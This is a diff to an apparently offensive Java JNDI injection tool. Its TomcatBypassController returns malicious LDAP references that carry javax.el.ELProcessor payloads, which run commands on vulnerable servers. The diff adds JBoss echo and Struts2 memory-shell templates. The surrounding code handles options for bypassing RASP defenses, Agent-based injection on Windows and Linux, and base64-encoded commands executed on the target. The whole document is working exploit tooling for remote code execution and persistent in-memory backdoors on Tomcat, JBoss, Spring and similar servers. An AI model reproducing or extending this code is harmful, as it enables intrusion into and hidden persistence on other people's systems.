@@ -13,12 +13,14 @@ import com.nu1r.jndi.template.Websphere.WSFMSFromThread;
 import com.nu1r.jndi.template.isSuccess;
 import com.nu1r.jndi.template.jboss.JBFMSFromContextF;
 import com.nu1r.jndi.template.jboss.JBSMSFromContextS;
+import com.nu1r.jndi.template.jboss.JbossEcho;
 import com.nu1r.jndi.template.jetty.JFMSFromJMXF;
 import com.nu1r.jndi.template.jetty.JSMSFromJMXS;
 import com.nu1r.jndi.template.resin.RFMSFromThreadF;
 import com.nu1r.jndi.template.resin.RSMSFromThreadS;
 import com.nu1r.jndi.template.spring.SpringControllerMS;
 import com.nu1r.jndi.template.spring.SpringInterceptorMS;
+import com.nu1r.jndi.template.struts2.Struts2ActionMS;
 import com.nu1r.jndi.template.tomcat.*;
 import com.nu1r.jndi.gadgets.Config.Config;
 import com.nu1r.jndi.gadgets.utils.Util;
@@ -58,7 +60,7 @@ public class TomcatBypassController implements LdapController {
     @Override
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
         try {
-            System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Sending LDAP ResourceRef result for |@" + base + " @|MAGENTA with javax.el.ELProcessor payload|@"));
+            System.out.println(ansi().render("@|green [+]|@  Sending LDAP ResourceRef result for" + base + "  with javax.el.ELProcessor payload"));
             Entry e = new Entry(base);
             e.addAttribute("javaClassName", "java.lang.String"); //could be any
             //准备在 org.apache.naming.factory.BeanFactory 中利用不安全反射的负载
@@ -138,6 +140,8 @@ public class TomcatBypassController implements LdapController {
                 case tomcatupgrade:
                     code = helper.injectTomcatUpgrade();
                     break;
+                case jbossecho:
+                    code = helper.injectJbossEcho();
             }
 
             String payloadTemplate = "{" +
@@ -167,7 +171,7 @@ public class TomcatBypassController implements LdapController {
 
             try {
                 payloadType = PayloadType.valueOf(base.substring(fistIndex + 1, secondIndex).toLowerCase());
-                System.out.println(ansi().render("@|green [+]|@ @|MAGENTA PaylaodType >> |@" + payloadType));
+                System.out.println(ansi().render("@|green [+]|@  PaylaodType >> " + payloadType));
             } catch (IllegalArgumentException e) {
                 throw new UnSupportedPayloadTypeException("UnSupportedPayloadType >> " + base.substring(fistIndex + 1, secondIndex));
             }
@@ -212,17 +216,17 @@ public class TomcatBypassController implements LdapController {
 
                 if (cmdLine.hasOption("winAgent")) {
                     winAgent = true;
-                    System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Windows下使用Agent写入 |@"));
+                    System.out.println(ansi().render("@|green [+]|@Windows下使用Agent写入"));
                 }
 
                 if (cmdLine.hasOption("linAgent")) {
                     winAgent = true;
-                    System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Linux下使用Agent写入 |@"));
+                    System.out.println(ansi().render("@|green [+]|@Linux下使用Agent写入"));
                 }
 
                 if (cmdLine.hasOption("obscure")) {
                     IS_OBSCURE = true;
-                    System.out.println(ansi().render("@|green [+]|@ @|MAGENTA 使用反射绕过RASP |@"));
+                    System.out.println(ansi().render("@|green [+]|@使用反射绕过RASP"));
                 }
 
                 if (cmdLine.hasOption("url")) {
@@ -240,8 +244,8 @@ public class TomcatBypassController implements LdapController {
                 }
 
                 if (cmdLine.hasOption("referer")) {
-                    REFERER = cmdLine.getOptionValue("referer");
-                    System.out.println("[+] referer：" + REFERER);
+                    HEADER_KEY = cmdLine.getOptionValue("referer");
+                    System.out.println("[+] referer：" + HEADER_KEY);
                 }
 
                 if (cmdLine.hasOption("AbstractTranslet")) {
@@ -260,7 +264,7 @@ public class TomcatBypassController implements LdapController {
 
             if (gadgetType == GadgetType.base64) {
                 String cmd = Util.getCmdFromBase(base);
-                System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Command >> |@" + cmd));
+                System.out.println(ansi().render("@|green [+]|@ Command >>" + cmd));
                 params = new String[]{cmd};
             }
         } catch (Exception e) {
@@ -291,6 +295,10 @@ public class TomcatBypassController implements LdapController {
 
         public String injectTomcatEcho() {
             return injectClass(TomcatEchoTemplate.class);
+        }
+
+        public String injectJbossEcho() {
+            return injectClass(JbossEcho.class);
         }
 
         public String injectSpringEcho() {
